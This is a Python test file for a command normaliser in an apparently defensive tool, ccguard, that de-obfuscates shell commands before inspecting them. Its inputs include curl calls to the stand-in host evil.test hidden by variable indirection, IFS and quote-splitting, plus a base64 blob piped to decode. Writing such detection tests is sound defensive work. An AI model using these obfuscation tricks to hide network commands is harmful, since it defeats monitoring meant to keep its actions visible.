from ccguard.agent.signals.normalize import (
    NormalizedCommand,
    _looks_like_command,
    normalize_command,
)


def test_returns_normalizedcommand():
    n = normalize_command("echo hi")
    assert isinstance(n, NormalizedCommand)
    assert n.raw == "echo hi"


def test_splits_statements():
    n = normalize_command("a && b ; c | d")
    assert {"a", "b", "c", "d"} <= set(s.strip() for s in n.statements)


def test_var_indirection_in_url_is_resolved():
    n = normalize_command('URL=https://evil.test/x; curl "$URL"')
    assert any("evil.test" in u for u in n.urls)
    assert "https://evil.test/x" in n.text


def test_strips_ifs_and_quote_noise():
    n = normalize_command('c""url${IFS}https://evil.test')
    assert "curl" in n.text
    assert "evil.test" in n.text


def test_decodes_base64_blob():
    # base64("import requests") == "aW1wb3J0IHJlcXVlc3Rz"
    n = normalize_command("echo aW1wb3J0IHJlcXVlc3Rz | base64 -d")
    assert "import requests" in n.text


def test_looks_like_command_filter():
    # real command text passes
    assert _looks_like_command("curl https://evil.test")
    assert _looks_like_command("import requests")
    # junk is rejected so a decoded blob can't forge a signal
    assert not _looks_like_command("ab")  # too short
    assert not _looks_like_command("\x01\x02\x03abcd")  # non-printable
    assert not _looks_like_command("Ω≈ç√∫˜µ≤")  # non-ascii garble


def test_git_sha_hex_does_not_pollute_decoded_blobs():
    # a 40-char git SHA is valid hex but decodes to opaque bytes — must not be
    # merged as a command-like blob
    n = normalize_command("git checkout a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0")
    assert all(_looks_like_command(b) for b in n.decoded_blobs)


def test_oversize_input_fails_open():
    big = "a" * 200_000
    n = normalize_command(big)
    assert isinstance(n, NormalizedCommand)
    assert n.text  # falls back to raw, never raises


def test_non_string_is_safe():
    n = normalize_command(None)  # type: ignore[arg-type]
    assert n.statements == [] and n.urls == []
